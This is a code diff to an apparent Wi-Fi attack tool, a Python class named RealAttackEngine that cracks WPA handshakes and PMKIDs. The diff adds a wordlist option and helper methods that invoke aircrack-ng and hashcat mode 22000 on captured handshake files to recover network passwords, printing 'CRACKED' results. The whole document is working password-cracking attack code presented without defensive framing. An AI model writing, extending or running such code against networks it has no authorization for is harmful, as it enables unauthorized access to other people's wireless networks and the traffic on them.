@@ -80,7 +80,7 @@ class RealAttackEngine:
             return False
 
     def execute_real_attack(self, target, interface="wlan0mon",
-                             max_duration=3600, seeds=None):
+                             max_duration=3600, seeds=None, wordlist=None):
         bssid = target.get("bssid", "")
         ssid = target.get("ssid", "?")
         channel = target.get("channel", 1)
@@ -102,6 +102,7 @@ class RealAttackEngine:
             "pmf_detected": False,
             "snr_passed": False,
             "isp_match": None,
+            "wordlist_used": wordlist,
             "errors": [],
         }
 
@@ -235,8 +236,10 @@ class RealAttackEngine:
             result["duration"] = time.time() - start_time
 
             if found_pw:
+                print(" " * 60, end="\r")
                 print(f"   CRACKED: {found_pw}")
             else:
+                print(" " * 60, end="\r")
                 print(f"   Failed after {tested:,} tests")
 
             self.performance_tracker.record_attack(target, result)
@@ -256,6 +259,15 @@ class RealAttackEngine:
         if not self.password_tester.setup_handshake_test(handshake_file):
             result["errors"].append("Handshake setup failed")
             return None, 0
+
+        wordlist = result.get("wordlist_used")
+        if wordlist and os.path.isfile(wordlist):
+            print(f"   Trying wordlist: {wordlist}")
+            found_pw, tested = self._try_wordlist_aircrack(
+                bssid, handshake_file, wordlist, result,
+            )
+            if found_pw:
+                return found_pw, tested
 
         print(f"   Cracking handshake with adaptive pipeline...")
         from intelligence.password_intelligence import PasswordIntelligence
@@ -286,6 +298,16 @@ class RealAttackEngine:
 
         gpu = self.hardware_optimizer.detect_gpu() if self.hardware_optimizer else {}
         use_gpu = gpu.get("available", False)
+
+        wordlist = result.get("wordlist_used")
+        if wordlist and os.path.isfile(wordlist):
+            print(f"   Trying wordlist: {wordlist}")
+            found_pw, tested = self._try_wordlist_hashcat(
+                pmkid_file, wordlist, use_gpu, result,
+            )
+            if found_pw:
+                return found_pw, tested
+
         if use_gpu:
             print(f"   Cracking PMKID with hashcat (GPU acceleration)...")
         else:
@@ -303,6 +325,7 @@ class RealAttackEngine:
 
         tested = 0
         found_pw = None
+        result["_crack_start"] = time.time()
 
         for password in self._seed_generator(base_seeds, max_tests):
             if found_pw:
@@ -317,11 +340,62 @@ class RealAttackEngine:
 
             tested += 1
             if tested % 10000 == 0:
-                elapsed = max(0.1, time.time() - result.get("_crack_start", time.time()))
+                elapsed = max(0.1, time.time() - result["_crack_start"])
                 speed = tested / elapsed if elapsed > 0 else 0
                 print(f"   PMKID crack: {tested:,} tested ({speed:,.0f} p/s)", end="\r")
 
+        print(" " * 60, end="\r")
         return found_pw, tested
+
+    def _try_wordlist_aircrack(self, bssid, handshake_file, wordlist, result):
+        try:
+            import tempfile
+            r = subprocess.run(
+                ["aircrack-ng", "-b", bssid, "-w", wordlist, handshake_file],
+                capture_output=True, text=True, timeout=300,
+            )
+            if "KEY FOUND" in r.stdout:
+                m = re.search(r"KEY FOUND.*?\[(.*?)\]", r.stdout)
+                if m:
+                    return m.group(1), 1
+            return None, 0
+        except subprocess.TimeoutExpired:
+            print(f"   Wordlist timeout (300s), continuing...")
+            return None, 0
+        except Exception:
+            return None, 0
+
+    def _try_wordlist_hashcat(self, hash_file, wordlist, use_gpu, result):
+        try:
+            cmd = [
+                "hashcat", "-m", "22000",
+                "-a", "0",
+                hash_file, wordlist,
+                "--potfile-disable",
+                "--runtime-limit=300",
+            ]
+            if use_gpu:
+                cmd.extend(["-D", "2"])
+            else:
+                cmd.extend(["-D", "1"])
+            cmd.append("--force")
+
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=310)
+            if r.returncode == 0:
+                show = subprocess.run(
+                    ["hashcat", "-m", "22000", "--show", hash_file,
+                     "--potfile-disable"],
+                    capture_output=True, text=True, timeout=10,
+                )
+                if show.stdout.strip():
+                    pw = show.stdout.strip().split(":")[-1] if ":" in show.stdout.strip() else show.stdout.strip()
+                    return pw, 1
+            return None, 0
+        except subprocess.TimeoutExpired:
+            print(f"   Hashcat wordlist timeout (300s), continuing...")
+            return None, 0
+        except Exception:
+            return None, 0
 
     def _seed_generator(self, seeds, max_count):
         seen = set()
